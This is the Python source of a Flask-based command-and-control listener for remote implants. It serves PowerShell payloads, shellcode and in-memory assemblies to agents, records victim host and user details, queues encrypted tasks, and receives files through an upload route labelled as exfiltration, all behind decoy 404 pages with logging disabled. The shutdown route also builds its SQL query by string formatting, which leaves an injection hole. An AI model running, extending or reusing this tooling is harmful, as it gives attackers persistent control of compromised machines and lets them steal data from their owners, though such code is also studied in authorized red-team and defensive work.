"""
Enhanced C2 Listener with multi-agent support and in-memory task management
"""
from flask import Flask, request, Response
import threading
import os
from werkzeug.serving import make_server
import logging
import sqlite3
import base64
from Core import encryption, database, color
from Core.agentmanager import agent_manager

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True


def parse_agent_info(decrypted_text):
    """Parse agent check-in information"""
    info = {}
    try:
        # Parse format: Machine_Name(xxx)Username(xxx)LocalIPs(xxx)OS(xxx)PID(xxx)
        import re
        patterns = {
            'hostname': r'Machine_Name\(([^)]+)\)',
            'username': r'Username\(([^)]+)\)',
            'local_ips': r'LocalIPs\(([^)]+)\)',
            'os_info': r'OS\(([^)]+)\)',
            'pid': r'PID\(([^)]+)\)'
        }
        for key, pattern in patterns.items():
            match = re.search(pattern, decrypted_text)
            if match:
                info[key] = match.group(1)
    except:
        pass
    return info


@app.route("/")
def index():
    return ("Running", 200)


@app.errorhandler(404)
def Error(issue):
    return ("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>", 404)


@app.route("/down/<name>/host.ps1", methods=['GET'])
def Download_Implant(name):
    """Serve implant download"""
    try:
        file = open("data/implant/%s/host.ps1" % name, "rt")
        content = file.read()
        file.close()
        return (content, 200)
    except:
        return ("", 400)


@app.route("/record/<name>", methods=['POST'])
def RecordAgent(name):
    """Agent initial check-in / registration"""
    # First get the agent key from database
    conn = sqlite3.connect("database.db")
    key_result = database.return_key(conn, name)
    
    if not key_result:
        return ("", 400)  # Agent not found in database
    
    key = key_result[0][0]
    
    # Mark as active in database
    database.Save_Implant(name)
    
    # Get listener info for this agent
    agent_info = conn.execute(
        "SELECT Listener_Name, Listener_IP, Listener_Port FROM Implant_Info WHERE Implant_Name=?", 
        (name,)
    ).fetchone()
    
    # Register or update agent in memory manager
    agent = agent_manager.get_agent(name)
    if not agent:
        # Register the agent if not already registered
        if agent_info:
            agent = agent_manager.register_agent(name, key, agent_info[0], agent_info[1], agent_info[2])
    
    # Parse and store agent info from check-in data
    result = request.form.get("result")
    info_dict = None
    if result:
        decrypted = decrypt_results(name, result)
        if decrypted:
            info_dict = parse_agent_info(decrypted)
            # Update database with agent info
            if info_dict:
                database.Update_Implant_Info(
                    name,
                    hostname=info_dict.get('hostname'),
                    username=info_dict.get('username'),
                    local_ips=info_dict.get('local_ips'),
                    os_info=info_dict.get('os_info'),
                    pid=info_dict.get('pid')
                )
    
    # Update agent manager with check-in
    if agent:
        agent_manager.agent_checkin(name, info_dict)
        print("\n[%s] Agent %s checked in! (%s@%s)" % (
            color.green("+"), 
            color.cyan(name),
            info_dict.get('username', 'unknown') if info_dict else 'unknown',
            info_dict.get('hostname', 'unknown') if info_dict else 'unknown'
        ))
    
    conn.close()
    return ("", 200)


@app.route("/beacon/<name>", methods=['GET', 'POST'])
def AgentBeacon(name):
    """Agent heartbeat/beacon - check for tasks"""
    agent = agent_manager.get_agent(name)
    
    # Try to register agent if not in memory
    if not agent:
        conn = sqlite3.connect("database.db")
        key_result = database.return_key(conn, name)
        if key_result:
            key = key_result[0][0]
            agent_info = conn.execute(
                "SELECT Listener_Name, Listener_IP, Listener_Port FROM Implant_Info WHERE Implant_Name=?", 
                (name,)
            ).fetchone()
            if agent_info:
                agent = agent_manager.register_agent(name, key, agent_info[0], agent_info[1], agent_info[2])
        conn.close()
    
    if not agent:
        return ("", 404)
    
    # Update last seen
    agent_manager.agent_checkin(name)
    database.Save_Implant(name)  # Mark active in DB too
    
    # Check for pending task in memory
    task = agent_manager.get_task(name)
    if task:
        return (task, 200)
    
    # Also check file-based tasks
    try:
        task_file = "data/implant/%s/tasks.enc" % name
        if os.path.exists(task_file):
            task = open(task_file, "r").read()
            if task:
                return (task, 200)
    except:
        pass
    
    return ("", 204)  # No content - no task


@app.route("/task/<name>", methods=['GET'])
def GiveATask(name):
    """Get task for agent - checks memory first, then falls back to file"""
    agent = agent_manager.get_agent(name)
    
    # Try to register agent if not in memory
    if not agent:
        conn = sqlite3.connect("database.db")
        key_result = database.return_key(conn, name)
        if key_result:
            key = key_result[0][0]
            agent_info = conn.execute(
                "SELECT Listener_Name, Listener_IP, Listener_Port FROM Implant_Info WHERE Implant_Name=?", 
                (name,)
            ).fetchone()
            if agent_info:
                agent = agent_manager.register_agent(name, key, agent_info[0], agent_info[1], agent_info[2])
        conn.close()
    
    # Update status
    if agent:
        agent_manager.agent_checkin(name)
        database.Save_Implant(name)
    
    # First check in-memory queue
    if agent:
        task = agent_manager.get_task(name)
        if task:
            return (task, 200)
    
    # Fallback to file-based for backwards compatibility
    try:
        task_file = "data/implant/%s/tasks.enc" % name
        if os.path.exists(task_file):
            task = open(task_file, "r").read()
            if task:
                return (task, 200)
    except:
        pass
    
    return ("", 204)


@app.route("/result/<name>", methods=['POST'])
def TakeAResult(name):
    """Receive result from agent"""
    result = request.form.get("result")
    if result:
        decrypted = decrypt_results(name, result.replace(' ', ''))
        
        # Store in agent manager for non-blocking retrieval
        if decrypted:
            agent_manager.store_result(name, decrypted)
            # Print result to console
            print("\n[%s] Result from %s:\n%s" % (color.green("+"), color.cyan(name), decrypted))
        
        # Update last seen
        agent_manager.agent_checkin(name)
        
        # Clean up file-based task if exists
        task_file = "data/implant/%s/tasks.enc" % name
        if os.path.exists(task_file):
            try:
                os.remove(task_file)
            except:
                pass
    
    return ("", 200)


@app.route("/task/<name>/file.ret", methods=['GET'])
def Download(name):
    """File download endpoint"""
    if os.path.exists("data/implant/%s/file.ret" % name):
        file = open("data/implant/%s/file.ret" % name, "r").read()
        if file:
            try:
                download_file = open(file, "r").read()
                os.remove("data/implant/%s/file.ret" % name)
                return (download_file, 200)
            except:
                return ("", 200)
        else:
            return ("", 200)
    else:
        return ("", 200)


@app.route("/assembly/<name>", methods=['GET'])
def GetAssembly(name):
    """Serve in-memory assembly for execution"""
    assembly = agent_manager.get_pending_assembly(name)
    if assembly:
        return Response(assembly, mimetype='application/octet-stream')
    return ("", 204)


@app.route("/shellcode/<name>", methods=['GET'])
def GetShellcode(name):
    """Serve shellcode for injection"""
    shellcode = agent_manager.get_pending_shellcode(name)
    if shellcode:
        return Response(shellcode, mimetype='application/octet-stream')
    return ("", 204)


@app.route("/module/<name>", methods=['GET'])
def GetModule(name):
    """Serve PowerShell module in-memory"""
    try:
        if os.path.exists("data/implant/%s/host.ps1" % name):
            content = open("data/implant/%s/host.ps1" % name, "r").read()
            return (content, 200)
    except:
        pass
    return ("", 204)


@app.route("/upload/<name>", methods=['POST'])
def UploadFile(name):
    """Receive uploaded file from agent (exfiltration)"""
    try:
        data = request.get_data()
        filename = request.headers.get('X-Filename', 'exfil_data')
        
        # Create uploads directory
        upload_dir = "data/implant/%s/uploads" % name
        os.makedirs(upload_dir, exist_ok=True)
        
        filepath = os.path.join(upload_dir, filename)
        with open(filepath, 'wb') as f:
            f.write(data)
        
        print("\n[%s] File uploaded from %s: %s" % (color.green("+"), name, filename))
        return ("", 200)
    except:
        return ("", 500)


@app.route("/shutdown/<name>/<token>", methods=['GET'])
def shutdown(name, token):
    try:
        connector = sqlite3.connect("database.db")
        connector.cursor()
        results = connector.execute("SELECT Listener_Name FROM Listener WHERE Listener_Token='%s'" % token)
        results = results.fetchall()
        if results:
            if results[0][0] == name:
                stop()
                return ("", 200)
        else:
            return ("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>", 404)
    except:
        return ("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>", 404)


def stop():
    shutdown_func = request.environ.get('werkzeug.server.shutdown')
    if shutdown_func is None:
        raise RuntimeError('Not running werkzeug')
    shutdown_func()


def start(ip, port):
    threading.Thread(target=app.run, daemon=True, args=[ip, int(port)], kwargs={'threaded': True}).start()


def decrypt_results(name, results):
    """Decrypt agent results"""
    try:
        conn = sqlite3.connect("database.db")
        key = database.return_key(conn, name)
        
        if not key:
            # Try with old name (renamed agent)
            key = database.return_rename_key(conn, name)
        
        if key:
            key = key[0][0]
            dec_results = encryption.DecryptString(results, key)
            
            # Also save to file for backwards compatibility
            os.makedirs("data/implant/%s" % name, exist_ok=True)
            with open("data/implant/%s/result.dec" % name, "w") as file:
                file.write(str(dec_results))
            
            conn.close()
            return dec_results
        conn.close()
    except Exception as e:
        print("[%s] Decrypt error: %s" % (color.red("-"), str(e)))
    return None
